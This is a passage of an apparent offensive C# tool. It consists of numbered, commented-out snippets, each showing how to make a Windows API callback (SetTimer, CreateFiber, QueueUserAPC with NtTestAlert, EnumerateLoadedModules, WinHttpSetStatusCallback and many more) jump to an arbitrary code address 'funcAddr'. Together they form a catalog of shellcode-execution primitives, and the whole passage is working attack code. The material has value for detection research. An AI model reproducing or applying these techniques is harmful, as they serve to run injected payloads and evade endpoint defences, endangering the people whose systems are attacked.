                hInternet
            );
            */

            //[49]
            //LdrEnumerateLoadedModules
            /*
            LdrEnumerateLoadedModules(
                IntPtr.Zero,
                funcAddr,
                0
            );
            */

            //[4A]
            //LineDDA
            /*
            LineDDA(
                0,
                0,
                1,
                1,
                funcAddr,
                IntPtr.Zero
            );
            */

            //[4B]
            //MFAddPeriodicCallback
            /*
            MFStartup(
                0x0002 << 16 | 0x0070,
                0x1
            );
            uint dwKey = 0;
            MFAddPeriodicCallback(
                funcAddr,
                IntPtr.Zero,
                out dwKey
            );
            System.Threading.Thread.Sleep(1000);
            MFShutdown();
            */

            //[4C]
            //MiniDumpWriteDump
            /*
            int MiniDumpNormal = 0;
            MiniDumpExceptionInformation s = new MiniDumpExceptionInformation();

            MiniDumpWriteDump(
                Process.GetCurrentProcess().Handle,
                Process.GetCurrentProcess().Id,
                IntPtr.Zero,
                MiniDumpNormal,
                ref s,
                IntPtr.Zero,
                ref funcAddr
            );
            */

            //[4D]
            //NotifyIpInterfaceChange
            /*
            uint AF_UNSPEC = 0x0;
            IntPtr hNotification = IntPtr.Zero;
            NotifyIpInterfaceChange(
                AF_UNSPEC,
                funcAddr,
                IntPtr.Zero,
                true,
                ref hNotification
            );
            */

            //[4E]
            //NotifyNetworkConnectivityHintChange
            /*
            IntPtr hNotification = IntPtr.Zero;
            NotifyNetworkConnectivityHintChange(
                funcAddr,
                IntPtr.Zero,
                true,
                out hNotification
            );

            System.Threading.Thread.Sleep(120 * 1000); //2 Min
            */

            //[4F]
            //NotifyRouteChange2
            /*
            uint AF_INET = 0x2;
            IntPtr hNotification = IntPtr.Zero;
            NotifyRouteChange2(
                AF_INET,
                funcAddr,
                IntPtr.Zero,
                true,
                ref hNotification
            );
            */

            //[50]
            //NotifyTeredoPortChange
            /*
            IntPtr hNotification = IntPtr.Zero;
            NotifyTeredoPortChange(
                funcAddr,
                IntPtr.Zero,
                true,
                ref hNotification
            );
            */

            //[51]
            //NotifyUnicastIpAddressChange
            /*
            IntPtr hNotification = IntPtr.Zero;
            uint AF_INET = 2;
            NotifyUnicastIpAddressChange(
                AF_INET,
                funcAddr,
                IntPtr.Zero,
                true,
                ref hNotification
            );
            */

            //[52]
            //NtTestAlert
            /*
            QueueUserAPC(
                funcAddr,
                GetCurrentThread(),
                IntPtr.Zero
            );
            NtTestAlert();
            */

            //[53]
            //OleUIBusy
            /*
            OLEUIBUSY sOleUIBusy = new OLEUIBUSY();
            sOleUIBusy.cbStruct = (uint)Marshal.SizeOf(sOleUIBusy);
            sOleUIBusy.hWndOwner = GetForegroundWindow();
            sOleUIBusy.lpfnHook = funcAddr;

            OleUIBusy(
                ref sOleUIBusy
            );
            */

            //[54]
            //PerfStartProviderEx
            /*
            Guid ProviderGuid = Guid.NewGuid();

            PERF_PROVIDER_CONTEXT sPPC = new PERF_PROVIDER_CONTEXT();
            sPPC.MemAllocRoutine = funcAddr;
            sPPC.ContextSize = (uint)Marshal.SizeOf(sPPC);

            IntPtr hProvider = IntPtr.Zero;
            PerfStartProviderEx(
                ref ProviderGuid,
                ref sPPC,
                out hProvider
            );

            PerfStopProvider(
                hProvider
            );
            */

            //[55]
            //PowerRegisterForEffectivePowerModeNotifications
            /*
            ulong EFFECTIVE_POWER_MODE_V2 = 0x2;
            IntPtr hRegister = IntPtr.Zero;
            PowerRegisterForEffectivePowerModeNotifications(
                EFFECTIVE_POWER_MODE_V2,
                funcAddr,
                IntPtr.Zero,
                ref hRegister
            );

            System.Threading.Thread.Sleep(-1);//INFINITE
            */

            //[56]
            //PrintDlg
            /*
            uint PD_ENABLEPRINTHOOK = 0x00001000;

            PRINTDLG sPrintDlg = new PRINTDLG();
            sPrintDlg.lStructSize = (uint)Marshal.SizeOf(sPrintDlg);
            sPrintDlg.Flags = PD_ENABLEPRINTHOOK;
            sPrintDlg.lpfnPrintHook = funcAddr;

            PrintDlg(
                sPrintDlg
            );
            */

            //[57]
            //ReadFileEx
            /*
            HANDLE hImg = CreateFile(
               "C:\\Users\\Public\\eicar.txt",
               (uint)EFileAccess.GENERIC_READ,
               0,
               IntPtr.Zero,
               OPEN_EXISTING,
               FILE_ATTRIBUTE_NORMAL,
               IntPtr.Zero
            );

            if (hImg == INVALID_HANDLE_VALUE || hImg == IntPtr.Zero)
                CloseHandle(hImg);

            byte[] buf = new byte[4096];
            System.Threading.NativeOverlapped overlap = new System.Threading.NativeOverlapped();
            ReadFileEx(
                hImg,
                buf,
                0,
                ref overlap,
                funcAddr
            );
            SleepEx(1000,true);
            CloseHandle(hImg);
            */

            //[58]
            //RegisterApplicationRecoveryCallback
            /*
            uint ret = RegisterApplicationRecoveryCallback(
                funcAddr,
                IntPtr.Zero,
                5,
                0
            );
            ret = UnregisterApplicationRecoveryCallback();
            */

            //[59]
            //RegisterWaitChainCOMCallback
            /*
            RegisterWaitChainCOMCallback(
                funcAddr,
                IntPtr.Zero
            );
            */

            //[5A]
            //RegisterWaitForSingleObject
            /*
            HANDLE hImg = CreateFileW(
                "C:\\Windows\\System32\\explorer.exe",
                (uint)EFileAccess.GENERIC_READ,
                FILE_SHARE_READ,
                IntPtr.Zero,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                IntPtr.Zero
            );
            IntPtr NewWaitObj = IntPtr.Zero;
            ulong WT_EXECUTEONLYONCE = 0x8;
            RegisterWaitForSingleObject(
                out NewWaitObj,
                hImg,
                funcAddr,
                IntPtr.Zero,
                0,
                WT_EXECUTEONLYONCE
            );
            System.Threading.Thread.Sleep(1000);
            */

            //[5B]
            //ReplaceText
            /*
            uint FR_ENABLEHOOK = 0x100;
            FINDREPLACE sFR = new FINDREPLACE();
            sFR.lStructSize = (uint)Marshal.SizeOf(sFR);
            sFR.hwndOwner = GetForegroundWindow();
            sFR.Flags = FR_ENABLEHOOK;
            sFR.lpfnHook = funcAddr;
            sFR.lpstrFindWhat = "h7arW";
            sFR.lpstrReplaceWith = "h7arW";
            sFR.wReplaceWithLen = 1;
            sFR.wFindWhatLen = 1;

            ReplaceText(
                ref sFR
            );
            */

            //[5C]
            //RoInspectCapturedStackBackTrace
            /*
            RoInspectCapturedStackBackTrace(
                IntPtr.Zero,
                0,
                funcAddr,
                0,
                0,
                UIntPtr.Zero
            );
            */

            //[5D]
            //RoInspectThreadErrorInfo
            /*
            RoInspectThreadErrorInfo(
                UIntPtr.Zero,
                0,
                funcAddr,
                0,
                UIntPtr.Zero
            );
            */

            //[5E]
            //SendMessageCallback
            //SendMessageCallbackA
            //SendMessageCallbackW
            /*
            SendMessageCallback(
                HWND_BROADCAST,
                0x1337,
                UIntPtr.Zero,
                IntPtr.Zero,
                funcAddr,
                UIntPtr.Zero
            );
            SendMessageCallbackA(
                HWND_BROADCAST,
                0x1337,
                UIntPtr.Zero,
                IntPtr.Zero,
                funcAddr,
                UIntPtr.Zero
            );
            SendMessageCallbackW(
                HWND_BROADCAST,
                0x1337,
                UIntPtr.Zero,
                IntPtr.Zero,
                funcAddr,
                UIntPtr.Zero
            );
            MSG msg = new MSG();
            GetMessage(
                out msg,
                IntPtr.Zero,
                0,
                0
            );

            DispatchMessage(
                ref msg
            );
            */

            //[5F]
            //SetTimer
            /*
            SetTimer(
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                funcAddr
            );

            MSG msg = new MSG();
            GetMessage(
                out msg,
                IntPtr.Zero,
                0,
                0
            );

            DispatchMessage(
                ref msg
            );
            */

            //[60]
            //SetupCommitFileQueue
            //SetupCommitFileQueueA
            //SetupCommitFileQueueW
            /*
            IntPtr hQueue = SetupOpenFileQueue();
            SetupQueueCopyW(
                hQueue,
                string.Empty,
                string.Empty,
                string.Empty,
                null,
                null,
                string.Empty,
                string.Empty,
                0x0000400
            );
            SetupCommitFileQueue(
                GetTopWindow(IntPtr.Zero),
                hQueue,
                funcAddr,
                IntPtr.Zero
            );
            SetupCommitFileQueueA(
                GetTopWindow(IntPtr.Zero),
                hQueue,
                funcAddr,
                IntPtr.Zero
            );
            SetupCommitFileQueueW(
                GetTopWindow(IntPtr.Zero),
                hQueue,
                funcAddr,
                IntPtr.Zero
            );
            */

            //[61]
            //SetupInstallFile
            /*
            HANDLE hImg = CreateFileW(
                "C:\\Users\\Public\\test.txt",
                (uint)EFileAccess.GENERIC_WRITE,
                0,
                IntPtr.Zero,
                CREATE_NEW,
                FILE_ATTRIBUTE_NORMAL,
                IntPtr.Zero
            );

            string[] eicar = { "W", "R", "A", "7", "H" };
            Encoding ascii = Encoding.ASCII;
            Encoding unicode = Encoding.Unicode;
            byte[] charArrA = ascii.GetBytes(eicar.ToString());
            byte[] charArrW = unicode.GetBytes(eicar.ToString());
            uint dwWritten = 0;

            WriteFile(
                hImg,
                charArrW,
                eicar.Length,
                ref dwWritten,
                IntPtr.Zero
            );
            CloseHandle(hImg);

            SetupInstallFile(
                IntPtr.Zero,
                IntPtr.Zero,
                "C:\\Windows\\notepad.exe",
                string.Empty,
                "C:\\Users\\Public\\test.txt",
                SP_COPY_NOOVERWRITE | SP_COPY_NEWER_OR_SAME | SP_COPY_SOURCE_ABSOLUTE,
                funcAddr,
                IntPtr.Zero
            );
            */

            //[62]
            //SetupIterateCabinet
            /*
            SetupIterateCabinet(
                "C:\\Windows\\SoftwareDistribution\\Download\\b075fa8225bab47caea704c57ab09fce\\DesktopDeployment.cab",
                0,
                funcAddr,
                0
            );
            */

            //[63]
            //SetWaitableTimer
            /*
            IntPtr hTimer = CreateWaitableTimer(
                IntPtr.Zero,
                false,
                string.Empty
            );
            LARGE_INTEGER sLI = new LARGE_INTEGER();
            SetWaitableTimer(
                hTimer,
                ref sLI,
                0,
                funcAddr,
                IntPtr.Zero,
                false
            );
            SleepEx(1000, true);
            */

            //[64]
            //SHBrowseForFolder
            /*
            BROWSEINFO sBI = new BROWSEINFO();
            sBI.hwndOwner = IntPtr.Zero;
            sBI.pidlRoot = IntPtr.Zero;
            sBI.pszDisplayName = IntPtr.Zero;
            sBI.lpszTitle = "h7arW";
            sBI.ulFlags = 0;
            sBI.lpfn = funcAddr;

            SHBrowseForFolder(
                ref sBI
            );
            */

            //[65]
            //SHCreateThread
            /*
            SHCreateThread(
                GetCurrentThread(),
                0,
                0,
                funcAddr
            );
            */

            //[66]
            //SHCreateThreadWithHandle
            /*
            IntPtr hThread = IntPtr.Zero;
            SHCreateThreadWithHandle(
                funcAddr,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                ref hThread
            );
            uint INFINITE = 0xFFFFFFFF;
            WaitForSingleObject(
                hThread,
                INFINITE
            );
            CloseHandle(
                hThread
            );
            */

            //[67]
            //StackWalk
            //StackWalk64
            /*
            STACKFRAME sStackFrame = new STACKFRAME();
            CONTEXT64 sContext64 = new CONTEXT64();

            StackWalk(
                MachineType.IMAGE_FILE_MACHINE_AMD64,
                GetCurrentProcess(),
                IntPtr.Zero,
                ref sStackFrame,
                ref sContext64,
                IntPtr.Zero,
                funcAddr,
                IntPtr.Zero,
                IntPtr.Zero
            );
 
            STACKFRAME64 sStackFrame64 = new STACKFRAME64();
            CONTEXT sContext = new CONTEXT();

            StackWalk64(
                MachineType.IMAGE_FILE_MACHINE_AMD64,
                GetCurrentProcess(),
                IntPtr.Zero,
                ref sStackFrame64,
                ref sContext,
                IntPtr.Zero,
                funcAddr,
                IntPtr.Zero,
                IntPtr.Zero
            );
            */

            //[68]
            //SwitchToFiber
            /*
            ConvertThreadToFiber(
                IntPtr.Zero
            );
            IntPtr sFiber = CreateFiber(
                0x100,
                funcAddr,
                IntPtr.Zero
            );
            SwitchToFiber(
                sFiber
            );
            */

            //[69]
            //SymEnumProcesses
            /*
            SymInitialize(
                GetCurrentProcess(),
                string.Empty,
                false
            );
            SymEnumProcesses(
                funcAddr,
                IntPtr.Zero
            );
            */

            //[6A]
            //SymFindFileInPath
            /*
            IntPtr hProcess = GetCurrentProcess();
            SymInitialize(
                hProcess,
                string.Empty,
                false
            );

            SYMSRV_INDEX_INFO finfo = new SYMSRV_INDEX_INFO();
            SymSrvGetFileIndexInfo(
                "c:\\windows\\system32\\kernel32.dll",
                ref finfo,
                0
            );

            StringBuilder dummy = new StringBuilder(2048);
            SymFindFileInPath(
                hProcess,
                "c:\\windows\\system32",
                "kernel32.dll",
                finfo.timestamp,
                finfo.size,
                0,
                SSRVOPT_DWORD,
                dummy,
                funcAddr,
                IntPtr.Zero
            );
            */

            //[6B]
            //SymRegisterCallback
            /*
            IntPtr hProcess = GetCurrentProcess();
            SymInitialize(
                hProcess,
                String.Empty,
                false
            );
            SymRegisterCallback(
                hProcess,
                funcAddr,
                IntPtr.Zero
            );
            SymRefreshModuleList(
                hProcess
            );
            */

            //[6C]
            //TrySubmitThreadpoolCallback
            /*
            TrySubmitThreadpoolCallback(
                funcAddr,
                IntPtr.Zero,
                IntPtr.Zero
            );
            System.Threading.Thread.Sleep(5000);
            */

            //[6D]
            //VerifierEnumResource
            /*
            VerifierEnumerateResource(
                Process.GetCurrentProcess().Handle,
                0,
                0,
                funcAddr,
                IntPtr.Zero
            );
            */

            //[6E]
            //WindowsInspectString
            /*
            uint len = 0;
            IntPtr pStringAddr = IntPtr.Zero;
            WindowsInspectString(
                "Wra7h",
                0x8664,
                funcAddr,
                IntPtr.Zero,
                ref len,
                ref pStringAddr
            );
            */

            //[6F]
            //WinHttpSetStatusCallback
            /*
            uint WINHTTP_ACCESS_TYPE_DEFAULT_PROXY = 0;
            string WINHTTP_NO_PROXY_NAME = null;
            string WINHTTP_NO_PROXY_BYPASS = null;

            IntPtr hSession = WinHttpOpen(
                null,
                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                WINHTTP_NO_PROXY_NAME,
                WINHTTP_NO_PROXY_BYPASS,
                0
            );

            uint WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS = 0xFFFFFFFF;
            WinHttpSetStatusCallback(
                hSession,
                funcAddr,
                WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS,
                IntPtr.Zero
            );

            WinHttpConnect(
                hSession,
                "localhost",
                80,
                0
            );
            */

            //[70]
            //WriteEncryptedFileRaw
            /*
            IntPtr pvContext = IntPtr.Zero;
            ulong CREATE_FOR_IMPORT = 1;
            OpenEncryptedFileRaw(
                System.IO.Path.GetTempFileName(),
                CREATE_FOR_IMPORT,
                out pvContext
            );
            WriteEncryptedFileRaw(
                funcAddr,
                IntPtr.Zero,
                pvContext
            );
            */

            //[71]
            //WriteFileEx
            /*
            HANDLE hImg = CreateFile(
                "C:\\Users\\Public\\eicar.txt",
                (uint)EFileAccess.GENERIC_WRITE|FILE_FLAG_OVERLAPPED,
                0,
                IntPtr.Zero,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                IntPtr.Zero
            );

            if (hImg == INVALID_HANDLE_VALUE || hImg == IntPtr.Zero)
                CloseHandle(hImg);

            byte[] buf = new byte[4096];
            System.Threading.NativeOverlapped overlap = new System.Threading.NativeOverlapped();
            WriteFileEx(
                hImg,
                buf,
                0,
                ref overlap,
                funcAddr
            );
            SleepEx(1000,true);
            CloseHandle(
                hImg
            );
            */

            //[72]  //User Interact
            //PdhBrowseCounters
            /*
            PDH_BROWSE_DLG_CONFIG sBDC = new PDH_BROWSE_DLG_CONFIG();
            sBDC.pCallBack = funcAddr;

            PdhBrowseCounters(
                ref sBDC
            );
            */
        }
    }
}
